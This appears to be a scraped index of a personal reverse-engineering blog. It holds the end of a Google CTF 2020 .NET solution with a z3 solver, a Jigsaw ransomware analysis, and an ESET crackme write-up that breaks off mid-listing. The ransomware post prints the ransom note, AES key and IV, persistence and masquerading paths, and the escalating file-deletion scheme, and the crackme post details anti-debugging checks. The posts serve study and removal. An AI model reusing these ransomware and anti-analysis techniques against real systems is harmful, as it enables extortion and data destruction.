std::string::operator[].\nIn this piece of code, we have ecx ule 9 for 0x40237e to be executed. Where ule is unsigned less or equal. So, if $$ecx \\lt 0$$ then ecx has bit 31 set, implying $$ecx = 2^{31} + a$$, so obviously ecx \u0026gt; 9. Therefore the only possibility is $$0 \\le ecx \\le 9$$\nSo, this block accepts digits and maps them to their integer equivalents.\nToCustomBase64 maps the input string '[0-9A-Za-z\\{\\}]+' to [0-63]. Digits are mapped to [0-9], uppercase letters are mapped to [10-35], lowercase letters to [36-61], { to 62 and } to 63\nNext the transformed input is passed to FYRKANTIGImpl. Similarly, I traced the offset to 0x004044B0\nWe have lea ecx, [ebp+src] before the call implying that the function sub_404F0C is a method of [ebp+src]. Something like this [ebp+src].sub_404F0C(byte_4081D0). So, it can be assumed that sub_404F0C is a std::string::string(char*) constructor. It then xor\u0026rsquo;s [ebp+dst] with [ebp+src]. Now I got stuck at sub_403F10\nSunday Evening I started debugging with IDA, it crashed. I moved onto x32dbg, but it crashed too\u0026hellip; hope lost\u0026hellip; Now I had to use WinDBG, my last option.\nI started debugging with windbg. First I cleared the PEB.IsDebuggerPresent flag and then put a breakpoint on 0x00403F65. I traced the call to the following code\npszEnd = 08h pszStart = 0Ch 061e8218 push ebp 061e8219 mov ebp, esp 061e821b push edi 061e821c push esi 061e821d push ebx 061e821e sub esp, 20h 061e8221 mov ebx, dword ptr fs:[0E20h] 061e8228 mov dword ptr [ebp-28h], offset clr!InlinedCallFrame::vftable 061e822f mov dword ptr [ebp-2Ch], 0FFF5AFAEh 061e8236 mov eax, dword ptr [ebx+0Ch] 061e8239 mov dword ptr [ebp-24h], eax 061e823c mov dword ptr [ebp-14h], ebp 061e823f mov dword ptr [ebp-18h], 0 061e8246 lea eax, [ebp-28h] 061e8249 mov dword ptr [ebx+0Ch], eax 061e824c mov dword ptr [ebp-10h], ecx 061e824f mov eax, dword ptr [ebp+pszStart] 061e8252 cmp eax, dword ptr [ebp+pszEnd] 061e8255 je 061e82c0 061e8257 mov esi, dword ptr [ebp+pszStart] 061e825a inc esi 061e825b cmp esi, dword ptr [ebp+pszEnd] 061e825e je 061e82c0 061e8260 mov edi, esi 061e8262 sub edi, dword ptr [ebp+pszStart] 061e8265 lea eax, [edi+1] 061e8268 push eax 061e8269 mov ecx, dword ptr [ebp-10h] 061e826c mov dword ptr [ebp-20h], 1227420h 061e8273 mov dword ptr [ebp-1Ch], esp 061e8276 mov dword ptr [ebp-18h], 61E8287h 061e827d mov byte ptr [ebx+8], 0 061e8281 call dword ptr ds:[122767Ch] ; ucrtbase!rand 061e8287 mov byte ptr [ebx+8], 1 061e828b cmp dword ptr [clr!g_TrapReturningThreads (755c2048)], 0 061e8292 je 061e829b 061e8294 push eax 061e8295 call clr!JIT_RareDisableHelper (74f3c2b0) 061e829a pop eax 061e829b mov dword ptr [ebp-18h], 0 061e82a2 mov edx, eax 061e82a4 cmp edx, edi 061e82a6 je 061e82b9 061e82a8 mov eax, dword ptr [ebp+pszStart] 061e82ab add eax, edx 061e82ad mov edx, eax 061e82af movsx ecx, byte ptr [esi] 061e82b2 movsx eax, byte ptr [edx] 061e82b5 mov byte ptr [esi], al 061e82b7 mov byte ptr [edx], cl 061e82b9 inc esi 061e82ba inc edi 061e82bb cmp esi, dword ptr [ebp+pszEnd] 061e82be jne 061e8265 061e82c0 mov edi, dword ptr [ebp-24h] 061e82c3 mov dword ptr [ebx+0Ch], edi 061e82c6 lea esp, [ebp-0Ch] 061e82c9 pop ebx 061e82ca pop esi 061e82cb pop edi 061e82cc pop ebp 061e82cd ret 8 The call at 0x061e8281 lands right here:\nIt points to rva 0x6bdc which is rand. So, what we have here is something like this\nsrand(0x23c); // pEnd is actually pStart+len-2 for (int j = 1; j \u0026lt; 28; j++) { int pos = rand() % (j+1); if (pos != j) { var tmp = ans[pos]; ans[pos] = ans[j]; ans[j] = tmp; } } The functions 0x403b9c, 0x404df6 and 0x404e89 are useless since they don\u0026rsquo;t reference esi which is the transformed input param.\nThe next function of interest is 0x404eee. Tracing it with windbg leads to 0x403AE0. Now all functions are resolved but 0x0404C3E. Tracing it, we land into std::swap. So, 0x403ae0 can be represented as\nstatic List\u0026lt;uint\u0026gt; Shuffle2(List\u0026lt;uint\u0026gt; inp) { var ans = new List\u0026lt;uint\u0026gt;(inp); for (int i = 0; i \u0026lt; inp.Count-1; i += 3) { if (i != 0x1c \u0026amp;\u0026amp; i != 0x1b) { var t = ans[i]; ans[i] = ans[i+1]; ans[i+1] = t; } } return ans; } Now GRUNDTAL_NORRVIKEN is called with the result of Shuffle2. We know that it has a prefix call to SPARSAM. So, SPARSAM will be called and then the control returns to GRUNDTAL_NORRVIKEN\nNote that it\u0026rsquo;s setting a ref param __result. According to Harmony\u0026rsquo;s docs, if a prefix assigns a value to __result, then the original function is skipped. So, SPARSAM replaces GRUNDTAL_NORRVIKEN. DAGSTORP is a plain xor, FLARDFULL does nothing. SMORBOLL computes a checksum and checks if the byte at index 28 matches the checksum. HEROISK calls VAXMYRA which ensures that all the bytes returned by DAGSTORP are unique and then validates a sequence of constraints.\nSolver #!/usr/bin/env python import string from z3 import * def checksum(l): n = 16 i = 0 while i \u0026lt; 30: if i != 28: n += l[i] if (i % 2 == 0): n += l[i] if (i % 3 == 0): n += -2*l[i] if (i % 5 == 0): n += -3*l[i] if (i % 7 == 0): n += 4*l[i] i += 1 return n \u0026amp; 63 def doCmp(a, b, c): return ULE(a-b, c) def xse(n): return SignExt(24, Extract(7, 0, n)) def se(n): return n def ze(n): return n fuckingBase = string.digits + string.ascii_uppercase + string.ascii_lowercase + \u0026#34;{}\u0026#34; invFuck = {} for i, j in enumerate(fuckingBase): invFuck[j] = i flag = [BitVec(\u0026#39;i%d\u0026#39; % i, 8) for i in range(30)] g = Solver() for i in flag[4:-1]: g.add(0 \u0026lt;= i, i \u0026lt; 64) for i, j in enumerate(\u0026#34;CTF{\u0026#34;): g.add(flag[i] == invFuck[j]) g.add(flag[-1] == invFuck[\u0026#39;}\u0026#39;]) f = [] t = [ 0x1F, 0x23, 0x3F, 0x3F, 0x1B, 0x07, 0x37, 0x21, 0x04, 0x33, 0x09, 0x3B, 0x39, 0x28, 0x30, 0x0C, 0x0E, 0x2E, 0x3F, 0x25, 0x2A, 0x27, 0x3E, 0x0B, 0x27, 0x1C, 0x38, 0x31, 0x1E, 0x3D ] # xor for i in range(30): f.append(xse(flag[i])^t[i]) # shuffle done by rand() impl -  f[0], f[1] = f[1], f[0] f[1], f[2] = f[2], f[1] f[0], f[3] = f[3], f[0] f[2], f[4] = f[4], f[2] f[3], f[5] = f[5], f[3] f[3], f[6] = f[6], f[3] f[0], f[8] = f[8], f[0] f[6], f[9] = f[9], f[6] f[7], f[10] = f[10], f[7] f[7], f[11] = f[11], f[7] f[0], f[12] = f[12], f[0] f[3], f[13] = f[13], f[3] f[10], f[14] = f[14], f[10] f[6], f[15] = f[15], f[6] f[15], f[16] = f[16], f[15] f[3], f[17] = f[17], f[3] f[5], f[18] = f[18], f[5] f[12], f[19] = f[19], f[12] f[14], f[20] = f[20], f[14] f[3], f[21] = f[21], f[3] f[5], f[22] = f[22], f[5] f[8], f[23] = f[23], f[8] f[17], f[24] = f[24], f[17] f[23], f[25] = f[25], f[23] f[22], f[26] = f[26], f[22] f[10], f[27] = f[27], f[10] for i in xrange(0, 29, 3): if i != 0x1c and i != 0x1b: f[i], f[i+1] = f[i+1], f[i] g.add(checksum(f) == f[28]) g.add(Distinct(f)) g.add(f[1] == 25) g.add(f[2] == 23) g.add(f[9] == 9) g.add(f[20] == 45) g.add(f[26] == 7) g.add(f[8] \u0026gt;= 15) g.add(f[12] \u0026lt;= 4) g.add(f[14] \u0026gt;= 48) g.add(f[29] \u0026gt;= 1) num = se(f[4]) num2 = se(f[3]) num3 = se(f[2]) num4 = se(f[1]) g.add(doCmp(se(f[0])+ ze(num4) + ze(num) + ze(num3) + ze(num2), 130, 10)) num4 = se(f[9]) num5 = se(f[8]) num6 = se(f[7]) num7 = se(f[6]) g.add(doCmp(se(f[5])+ ze(num7) + ze(num6) + ze(num5) + ze(num4), 140, 10)) num8 = se(f[14]) num9 = se(f[13]) num10 = se(f[12]) num11 = se(f[11]) g.add(doCmp(se(f[10]) + ze(num11) + ze(num10) + ze(num9) + ze(num8), 150, 10)) num12 = se(f[19]) num13 = se(f[18]) num14 = se(f[17]) num15 = se(f[16]) g.add(doCmp(se(f[15]) + ze(num15) + ze(num14) + ze(num13) + ze(num12), 160, 10)) num16 = se(f[24]) num17 = se(f[23]) num18 = se(f[22]) num19 = se(f[21]) g.add(doCmp(se(f[20]) + ze(num19) + ze(num18) + ze(num17) + ze(num16), 170, 10)) num20 = se(f[25]) num21 = se(f[20]) num22 = se(f[15]) num23 = se(f[10]) num24 = se(f[5]) g.add(doCmp(se(f[0] )+ ze(num24) + ze(num23) + ze(num22) + ze(num21) + ze(num20), 172, 6)) num25 = se(f[26]) num26 = se(f[21]) num27 = se(f[16]) num28 = se(f[11]) num29 = se(f[6]) g.add(doCmp(se(f[1] )+ ze(num29) + ze(num28) + ze(num27) + ze(num26) + ze(num25), 162, 6)) num30 = se(f[27]) num31 = se(f[22]) num32 = se(f[17]) num33 = se(f[12]) num34 = se(f[7]) g.add(doCmp(se(f[2] )+ ze(num34) + ze(num33) + ze(num32) + ze(num31) + ze(num30), 152, 6)) num35 = se(f[23]) num36 = se(f[18]) num37 = se(f[13]) num38 = se(f[8]) g.add(doCmp(se(f[3] )+ ze(num38) + ze(num37) + ze(num36) + ze(num35), 142, 6)) num39 = se(f[29]) num40 = se(f[24]) num41 = se(f[19]) num42 = se(f[14]) num43 = se(f[9]) g.add(doCmp(se(f[4] )+ ze(num43) + ze(num42) + ze(num41) + ze(num40) + ze(num39), 132, 6)) num44 = f[27] * 3 num45 = (f[7] + num44) * 3 - f[5] * 13 g.add(doCmp(num45, 57, 28)) num44 = f[20] * 5 num44 = (f[14] \u0026lt;\u0026lt; 2) - num44 num45 = f[22] * 3 + num44 g.add(doCmp(num45, 12, 70)) num44 = f[18] * 2 num44 = (f[15] - num44) * 3 num46 = f[16] * 2 num46 = (f[14] + num46) * 2 + num44 - f[17] * 5 g.add(f[13] + num46 == 0) num46 = f[6] * 2 g.add(f[5] == num46) g.add(f[29] + f[7] == 59) num47 = f[17] * 6 g.add(f[0] == num47) num47 = f[9] * 4 g.add(f[8] == num47) num47 = f[13] * 3 g.add((f[11] \u0026lt;\u0026lt; 1) == num47) g.add(f[13] + f[29] + f[11] + f[4] == f[19]) num48 = f[12] * 13 g.add(f[10] == num48) # from: # https://stackoverflow.com/questions/11867611/z3py-checking-all-solutions-for-equation def get_models(s, M): result = [] while len(result) \u0026lt; M and s.check() == sat: m = s.model() yield m result.append(m) block = [] for d in m: if d.arity() \u0026gt; 0: raise Z3Exception(\u0026#39;uninterpreted functions are not supported\u0026#39;) c = d() if is_array(c) or c.sort().kind() == Z3_UNINTERPRETED_SORT: raise Z3Exception(\u0026#39;arrays and uninterpreted sorts are not supported\u0026#39;) block.append(c != m[d]) s.add(Or(block)) def check(ans): l = [\u0026#39;WeirD\u0026#39;, \u0026#39;Weird\u0026#39;, \u0026#39;CppClr\u0026#39;, \u0026#39;Jit\u0026#39;] return any(i in ans for i in l) for m in get_models(g, 1337): fuck = [] for j, i in enumerate(flag): fuck.append(m[i].as_long()) # print \u0026#34; \u0026#34;.join(\u0026#34;%02x\u0026#34; % i for i in fuck) x = \u0026#34;\u0026#34;.join(fuckingBase[i] for i in fuck) if check(x): print x Which prints the flag - CTF{CppClrIsWeirdButReallyFun}\nMy Mistakes\u0026hellip;  Failed to notice the RVA pointed out by dnSpy for unmanaged functions. Failed to recognize that the transition from unmanaged to managed code is done by using metadata tokens.  If I knew these, the challenge could be solved in one hour, 30 mins max.\n","date":"2020-08-31T00:00:00Z","permalink":"http://localhost:1313/post/google-ctf-2020-.net/","title":"Google CTF 2020 - .NET"},{"content":" SHA1: 27d99fbca067f478bb91cdbcb92f13a828b00859\n Today I\u0026rsquo;ll be analyzing Jigsaw Ransomware.\nRunning detect-it-easy, we get\nSo the binary is packed using ConfuserEx, an open source obfuscator.\nLet\u0026rsquo;s unpack the binary first.\nPlace a breakpoint after the first call at Module::.cctor, execute it and when the control hits the breakpoint, dump the module from the modules window.\nOpen it in dnSpy, and nop out the first call by selecting Edit IL Instructions and change the first instruction to nop and save the module.\nPerform the same operations for the second call before AssemblyLoader.Attach\nThe module named \u0026lt;unknown\u0026gt; contains the resources. It\u0026rsquo;s a DLL module (QbZlczhiHcyXUZulvpHjfBbHhhxY.dll).\n 0x00000410: ExtensionsToEncrypt‎ = \u0026quot;.jpg .jpeg .raw .tif .gif .png .bmp\\r\\n.3dm .max\\r\\n.accdb .db .dbf .mdb .pdb .sql\\r\\n.dwg .dxf\\r\\n.c .cpp .cs .h .php .asp .rb .java .jar .class .py .js\\r\\n.aaf .aep .aepx .plb .prel .prproj .aet .ppj .psd .indd .indl .indt .indb .inx .idml .pmd .xqx .xqx .ai .eps .ps .svg .swf .fla .as3 .as\\r\\n.txt .doc .dot .docx .docm .dotx .dotm .docb .rtf .wpd .wps .msg .pdf .xls .xlt .xlm .xlsx .xlsm .xltx .xltm .xlsb .xla .xlam .xll .xlw .ppt .pot .pps .pptx .pptm .potx .potm .ppam .ppsx .ppsm .sldx .sldm\\r\\n.wav .mp3 .aif .iff .m3u .m4u .mid .mpa .wma .ra .avi .mov .mp4 .3gp .mpeg .3g2 .asf .asx .flv .mpg .wmv .vob .m3u8\\r\\n.dat .csv .efx .sdf .vcf .xml .ses\\r\\n.Qbw .QBB .QBM .QBI .QBR \\r\\n.Cnt .Des .v30 .Qbo .Ini .Lgb .Qwc .Qbp .Aif .Qba .Tlg .Qbx .Qby \\r\\n.1pa .Qpd .Txt .Set .Iif \\r\\n.Nd .Rtp .Tlg .Wav .Qsm .Qss .Qst .Fx0 .Fx1 .Mx0 .FPx .Fxr .Fim .ptb .Ai .Pfb .Cgn .Vsd .Cdr .Cmx .Cpt .Csl .Cur .Des .Dsf .Ds4\\r\\n .Drw .Dwg.Eps .Ps .Prn .Gif .Pcd .Pct .Pcx .Plt .Rif .Svg .Swf .Tga .Tiff .Psp .Ttf .Wpd .Wpg .Wi .Raw .Wmf .Txt .Cal .Cpx .Shw .Clk .Cdx .Cdt .Fpx .Fmv .Img .Gem .Xcf .Pic .Mac .Met \\r\\n.PP4 .Pp5 .Ppf .Xls .Xlsx .Xlsm .Ppt .Nap .Pat .Ps .Prn .Sct .Vsd .wk3 .wk4 .XPM .zip .rar \\r\\n\u0026quot; 0x00000864: Jigsaw = [System.Drawing.Bitmap] : A clown 0x00006FE0: StartModeDebug‎ = \u0026quot;I'm running in Debug mode\u0026quot; 0x00006FFB: vanityAddresses‎ = \u0026quot;1L9GdBW65Rt6e8UY69bnWNWomsppFFFR2X\\r\\n13VEVaJUMdJyQ7ttPfBaVNKjj2dS9ahU1z\\r\\n15fbyNgDnqYQR5vSHJ8PTAEJbKy4dwNBCZ\\r\\n1Q5B5udzDLpNJbpedGpyGMLVU5DR5dTqx6\\r\\n18hxbo2Rcp7zmWNsVryFrfZiLGajByWSG1\u0026quot; Opening the new module in dnSpy, and renaming the functions, we get\nThe class Main.Config contains the static data\nstatic Config() { // Appdata/Roaming  string path = Config.Environment_GetFolderPath(Environment.SpecialFolder.ApplicationData); // Appdata/Local  string path2 = Config.Environment_GetFolderPath(Environment.SpecialFolder.LocalApplicationData); Config.StartMode = Config.StartModeType.ErrorMessage; /* If current-date \u0026gt; ActiveAfterDateTime { // Encrypt Files } */ Config.ActiveAfterDateTime = new DateTime(2016, 4, 1); // Info Message  Config.ErrorMessage = \u0026#34;Congratulations. Your software has been registered. Confirmation code 994759\u0026#34; + Environment.NewLine + \u0026#34;Email us this code in the chat to active your software. It can take up to 48 hours.\u0026#34;; Config.ErrorTitle = \u0026#34;Thank you\u0026#34;; // Create Entry in \u0026#34;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34;  Config.StartupMethod = Windows.StartupMethodType.Registry; Config.TempExeRelativePath = \u0026#34;Drpbx\\\\drpbx.exe\u0026#34;; Config.FinalExeRelativePath = \u0026#34;Frfx\\\\firefox.exe\u0026#34;; Config.FinalExePath = Path.Combine(path, Config.FinalExeRelativePath); Config.TempExePath = Path.Combine(path2, Config.TempExeRelativePath); Config.WorkFolderRelativePath = \u0026#34;System32Work\\\\\u0026#34;; Config.WorkFolderPath = Path.Combine(path, Config.WorkFolderRelativePath); if (!Directory.Exists(Config.WorkFolderPath)) { Directory.CreateDirectory(Config.WorkFolderPath); } Config.OnlyRunAfterSysRestart = false; Config.WelcomeMessage = string.Concat(new string[] { \u0026#34;Your computer files have been encrypted. Your photos, videos, documents, etc....\u0026#34;, Environment.NewLine, \u0026#34;But, don\u0026#39;t worry! I have not deleted them, yet.\u0026#34;, Environment.NewLine, \u0026#34;You have 24 hours to pay 150 USD in Bitcoins to get the decryption key.\u0026#34;, Environment.NewLine, \u0026#34;Every hour files will be deleted. Increasing in amount every time.\u0026#34;, Environment.NewLine, \u0026#34;After 72 hours all that are left will be deleted.\u0026#34;, Environment.NewLine, Environment.NewLine, \u0026#34;If you do not have bitcoins Google the website localbitcoins.\u0026#34;, Environment.NewLine, \u0026#34;Purchase 150 American Dollars worth of Bitcoins or .4 BTC. The system will accept either one.\u0026#34;, Environment.NewLine, \u0026#34;Send to the Bitcoins address specified.\u0026#34;, Environment.NewLine, \u0026#34;Within two minutes of receiving your payment your computer will receive the decryption key and return to normal.\u0026#34;, Environment.NewLine, \u0026#34;Try anything funny and the computer has several safety measures to delete your files.\u0026#34;, Environment.NewLine, \u0026#34;As soon as the payment is received the crypted files will be returned to normal.\u0026#34;, Environment.NewLine, Environment.NewLine, \u0026#34; Thank you \u0026#34; }); // Ransom Amount  Config.RansomUsd = 150; Config.TaskMessage = \u0026#34;Please, send $\u0026#34; + Config.RansomUsd + \u0026#34; worth of Bitcoin here:\u0026#34;; // ...  // Token: 0x04000033 RID: 51  internal const string EncryptionFileExtension = \u0026#34;.fun\u0026#34;; // Token: 0x04000034 RID: 52  internal const int MaxFilesizeToEncryptInBytes = 10000000; // Token: 0x04000035 RID: 53  // AES Key  internal const string EncryptionPassword = \u0026#34;OoIsAwwF23cICQoLDA0ODe==\u0026#34;; } Nothing to discuss as the names are self-explanatory. Later we\u0026rsquo;ll see that the ransomware is copied into two locations:\n AppData\\Local\\Drpbx\\drpbx.exe AppData\\Roaming\\Frfx\\firefox.exe  In Hacking.InitSoftware, we have\nIf Main() has been called with exactly one argument, it displays a message-box with the text Config.ErrorMessage.\nNext, it copies itself to startup directory and to the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\nAnd after copying itself into Appdata\\Roaming\\Frfx and AppData\\Local\\Drpbx folders using Hacking.ExeSmartCopy, it restarts itself as drpbx.exe\ntimerActivateChecker_Tick is executed every 6 seconds. But the flag Config.Activated restricts its execution frequency to once.\nIf the current date is greater than 01-04-2016, encrypt all the files and show the form FormGame\nThe list of file types to encrypt are specified by Resources.ExtensionsToEncrypt‎. The extensions are separated by CrLf and spaces.\nThe Locker.EncryptFileSystem recursively encrypts the files and stores the names of the encrypted files in AppData\\Roaming\\System32Work\\EncryptedFileList.txt\nOnly the files whose size is less than 10**7 are encrypted.\nThe files are encrypted using AES with the key - OoIsAwwF23cICQoLDA0ODe== and the IV - AAEAAwUDAAEAAAIABgcGAA==\nAfter encrypting the files, the form FormGame is displayed.\nIt displays a ransom message Config.WelcomeMessage and\nprivate static string GetBitcoinAddess() { string text = FormGame.Path_Combine(Config.WorkFolderPath, \u0026#34;Address.txt\u0026#34;); if (FormGame.File_Exists(text)) { return FormGame.File_ReadAllText(text); } HashSet\u0026lt;string\u0026gt; hashSet = new HashSet\u0026lt;string\u0026gt;(); foreach (string text2 in FormGame.StrSplit(Resources.vanityAddresses, new string[] { FormGame.NewLine() }, StringSplitOptions.RemoveEmptyEntries).ToList\u0026lt;string\u0026gt;()) { hashSet.Add(FormGame.StrTrim(text2)); } string text3 = Enumerable.OrderBy\u0026lt;string, Guid\u0026gt;(hashSet, (string x) =\u0026gt; Guid.NewGuid()).FirstOrDefault\u0026lt;string\u0026gt;(); FormGame.File_WriteAllText(text, text3); return text3; } GetBitcoinAddess fetches a random bitcoin from Appdata\\Roaming\\System32Work\\Address.txt. The randomization is due to Guid.NewGuid()\nThe default list of bitcoin addresses are stored in the resource Resources.vanityAddresses‎\nDidRun checks if the app ran atleast once. If so, it deletes 1000 encrypted files.\nIf the amount paid is atleast 150 USD, the timer stops. It then decrypts the encrypted files and removes itself (by executing a batch script).\nAfter every hour, N files are deleted. N is computed using\nint N() { static int n = 0; return (int) pow(1.1, n++); } The bitcoin transactions use the blockr api.\nRemoval The file AppData\\Roaming\\System32Work\\dr must be DELETED within one hour after the malware executes to prevent deletion of files.\nIterate through the files present in AppData\\Roaming\\System32Work\\EncryptedFileList.txt and decrypt the files using the AES Key - OoIsAwwF23cICQoLDA0ODe== and IV - AAEAAwUDAAEAAAIABgcGAA==.\nThe malware binaries can be removed by deleting the files\n Appdata\\Roaming\\Frfx\\firefox.exe AppData\\Local\\Drpbx\\drpbx.exe The file firefox.exe in the startup folder The registry entry named firefox.exe in HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ","date":"2020-01-01T00:00:00+05:30","permalink":"http://localhost:1313/post/analysing-jigsaw-ransomware/","title":"Analysing Jigsaw Ransomware"},{"content":"While searching the internet for good crackmes, I found this one!\nESET Crackme\nI first tried to solve it in 2018. Out of 3 passwords, I could only find two! The second time I tried was on October 19, 2019. This time I could solve it completely.\nLet\u0026rsquo;s dive into it :-)\nTask-1 .text:004013F6 call ds:IsDebuggerPresent\r.text:004013FC test eax, eax\r.text:004013FE jz short loc_401408\r.text:00401400 push 0 ; uExitCode\r.text:00401402 call ds:ExitProcess\r.text:00401408 ; ---------------------------------------------------------------------------\r.text:00401408\r.text:00401408 loc_401408: ; CODE XREF: _main+E↑j\r.text:00401408 mov [ebp+NumberOfCharsWritten], 0\r.text:0040140F push 3\r.text:00401411 push 25h\r.text:00401413 push 1Fh\r.text:00401415 push offset aPleaseEnterVal ; \u0026quot;Please enter valid password : \u0026quot;\r.text:0040141A call EncodeDecode\r.text:0040141F push 0 ; lpReserved\r.text:00401421 lea eax, [ebp+NumberOfCharsWritten]\r.text:00401424 push eax ; lpNumberOfCharsWritten\r.text:00401425 push offset aPleaseEnterVal ; \u0026quot;Please enter valid password : \u0026quot;\r.text:0040142A call _strlen\r.text:0040142F add esp, 4\r.text:00401432 push eax ; nNumberOfCharsToWrite\r.text:00401433 push offset aPleaseEnterVal ; lpBuffer\r.text:00401438 mov ecx, hConsoleOutput\r.text:0040143E push ecx ; hConsoleOutput\r.text:0040143F call ds:WriteConsoleA\rEncodeDecode is a simple xor encoding. A small IDA script can save the time :-)\ndef EncodeDecode(ea, size, xor, inc): for i in xrange(size): PatchByte(ea, Byte(ea)^xor) xor = xor+inc \u0026amp; 0xff The second anti-debugging check is present at\n.text:00401622 mov eax, large fs:30h ; PEB\r.text:00401628 movzx eax, byte ptr [eax+2] ; PEB.BeingDebugged\r.text:0040162C test eax, eax\r.text:0040162E jnz short loc_401632\r.text:00401630 jmp short loc_40163A\r.text:00401632 ; ---------------------------------------------------------------------------\r.text:00401632\r.text:00401632 loc_401632: ; CODE XREF: _main+23E↑j\r.text:00401632 push 0 ; uExitCode\r.text:00401634 call ds:ExitProcess\rThe third anti-debugging check uses GetTickCount\n.text:00401475 call ds:GetTickCount\r.text:0040147B mov [ebp+var_14], eax\r;\r; ... flag checking stuff ...\r;\r.text:0040163A loc_40163A: ; CODE XREF: _main+240↑j\r.text:0040163A call ds:GetTickCount\r.text:00401640 mov [ebp+var_10], eax\r.text:00401643 mov eax, [ebp+var_10]\r.text:00401646 sub eax, [ebp+var_14]\r.text:00401649 cmp eax, 64h\r.text:0040164C jbe short loc_401656\r.text:0040164E push 0 ; uExitCode\r.text:00401650 call ds:ExitProcess\rThe flag checking stuff is a series of equations which are validated\nszInput[7]+szInput[6] == 0xcd \u0026amp;\u0026amp;\rszInput[8]+szInput[5] == 0xc9 \u0026amp;\u0026amp;\rszInput[7]+szInput[6]+szInput[3] == 0x13a \u0026amp;\u0026amp;\rszInput[9]+szInput[4]+szInput[8]+szInput[5] == 0x16f \u0026amp;\u0026amp;\rszInput[1]+szInput[0] == 0xc2 \u0026amp;\u0026amp;\rszInput[0]+...+szInput[9] == 0x39b\rFrom the above equations, we get\nszInput[3] = 0x13a-0xcd\rszInput[2] = 0x39b-(0x16f+0x13a+0xc2)\rszInput[0] = ?\rszInput[1] = 0xc2-szInput[0]\rszInput[4] = ?\rszInput[9] = 0x16f-0xc9-szInput[4]\rszInput[5] = ?\rszInput[8] = 0xc9-szInput[5]\rszInput[6] = ?\rszInput[7] = 0xcd-szInput[6]\rIf these equations are satisfied, and you bypass the anti-debugging checks, you get\n.text:00401656 loc_401656:\r.text:00401656 push 0Ah\r.text:00401658 lea ecx, [ebp+Buffer]\r.text:0040165B push ecx\r.text:0040165C call Ror9Hash ; compute hash\r.text:00401661 cmp eax, 1928F914h\r.text:00401666 jnz short loc_4016C9\rRor9Hash does something like this\ndef Ror9Hash(buf, size): ans = 0 for i in xrange(size): ans = ror(ans, 9)^buf[i] return ans So, now do we need to brute 4 bytes for matching the hash? No! Why ??? Analyze a bit more before looking below \u0026hellip;.\nIf the hash matches, the following is printed\n.data:00418038 aGoodWorkLittle db '!Good work. Little help:',0Ah\r.data:00418038 ; DATA XREF: _main+2DF↑o\r.data:00418038 ; _main+2EF↑o ...\r.data:00418038 db 'char[8] = 85',0Ah\r.data:00418038 db 'char[0] + char[2] = 128',0Ah\r.data:00418038 db 'char[4] - char[7] = -50',0Ah\r.data:00418038 db 'char[6] + char[9] = 219',0Ah,0\rFrom these equations, we get the key\n# solution.py N = 10 b = [\u0026#39;\u0026#39; for _ in xrange(N)] b[8] = 85 # 0+2 = 128, 4-7 = -50, 6+9 = 219 # 7+6 = 0xcd # 8+5 = 0xc9 b[5] = 0xc9-b[8] # 7+6+3 = 0x13a b[3] = 0x13a-0xcd # 9+4+8+5 = 0x16f # 1+0 = 0xc2 # sum = 0x39b # sum(0..3) = 351 # 4+5+6+7+8+9 = 572 # 4+7 = 152 # 4-7 = -50 b[4] = 51 b[7] = 50+b[4] b[6] = 0xcd-b[7] b[9] = 219-b[6] # 0+1+2 = 242 b[2] = 242-0xc2 b[1] = 242-128 b[0] = 0xc2 - b[1] print \u0026#34;\u0026#34;.join(map(chr, b)) Which yields - Pr0m3theUs\nBut on entering the key, it prints out\n Congratulations! You guessed the right password, but the message you see is wrong. Try to look for some unreferenced data, that can be decrypted the same way as this text.\n So, we missed out something :(\nLet\u0026rsquo;s take a step back and look at the ctors (called by __cinit)\n.text:00402AE8 mov esi, offset dword_412144\r.text:00402AED mov edi, offset dword_412154\r.text:00402AF2 jmp short loc_402AFF\r.text:00402AF4 ; ---------------------------------------------------------------------------\r.text:00402AF4\r.text:00402AF4 loc_402AF4: ; CODE XREF: __cinit+65↓j\r.text:00402AF4 mov eax, [esi]\r.text:00402AF6 test eax, eax\r.text:00402AF8 jz short loc_402AFC\r.text:00402AFA call eax\r.text:00402AFC\r.text:00402AFC loc_402AFC: ; CODE XREF: __cinit+5C↑j\r.text:00402AFC add esi, 4\r.text:00402AFF\r.text:00402AFF loc_402AFF: ; CODE XREF: __cinit+56↑j\r.text:00402AFF cmp esi, edi\r.text:00402B01 jb short loc_402AF4\r;\r; .... stuff ...\r;\r.rdata:00412144 dword_412144 dd 0 ; DATA XREF: __cinit+4C↑o\r.rdata:00412148 dd offset InitStdIn\r.rdata:0041214C dd offset InitStdOut\r.rdata:00412150 dd offset sub_411390\rsub_411390 searches for the module whose Ror9Hash matches 19B9AC28h. It happens to be kernel32. The routine then searches the export table for the hash - 0D9A63D0Dh which resolves to GetModuleFileName\n.text:0040124B mov ecx, [ebp+var_48]\r.text:0040124E mov [ebp+fnGetModuleFileName], ecx\r.text:00401251 push 104h\r.text:00401256 lea edx, [ebp+szModuleName]\r.text:0040125C push edx\r.text:0040125D push 0\r.text:0040125F call [ebp+fnGetModuleFileName]\r.text:00401262 mov [ebp+var_74], eax\r.text:00401265 push 0 ; char *\r.text:00401267 lea eax, [ebp+var_478]\r.text:0040126D push eax ; char *\r.text:0040126E push 0 ; char *\r.text:00401270 push 0 ; char *\r.text:00401272 lea ecx, [ebp+szModuleName]\r.text:00401278 push ecx ; char *\r.text:00401279 call __splitpath\r.text:0040127E add esp, 14h\r.text:00401281 mov [ebp+var_38], 'C'\r.text:00401285 mov [ebp+var_37], 'r'\r.text:00401289 mov [ebp+var_36], '4'\r.text:0040128D mov [ebp+var_35], 'c'\r.text:00401291 mov [ebp+var_34], 'k'\r.text:00401295 mov [ebp+var_33], 'M'\r.text:00401299 mov [ebp+var_32], '3'\r.text:0040129D mov [ebp+var_31], 0\r.text:004012A1 lea edx, [ebp+var_38]\r.text:004012A4 push edx ; char *\r.text:004012A5 lea eax, [ebp+var_478]\r.text:004012AB push eax ; char *\r.text:004012AC call _strcmp\rNow I guess we know what to do. Just rename the file crackme.exe to Cr4ckM3.exe and\nx0r19x91@x0r19x91 /cygdrive/c/Users/x0r19x91/Desktop/ESET $ ./Cr4ckM3.exe Please enter valid password : Pr0m3theUs https://join.eset.com/ae50b61499d27d7da010c718f265a9a1/crackme.zip Yeah !! Now we have the actual crackme!\nTask-2 .text:00402375 push 104h ; nSize\r.text:0040237A lea eax, [ebp+Filename]\r.text:00402380 push eax ; 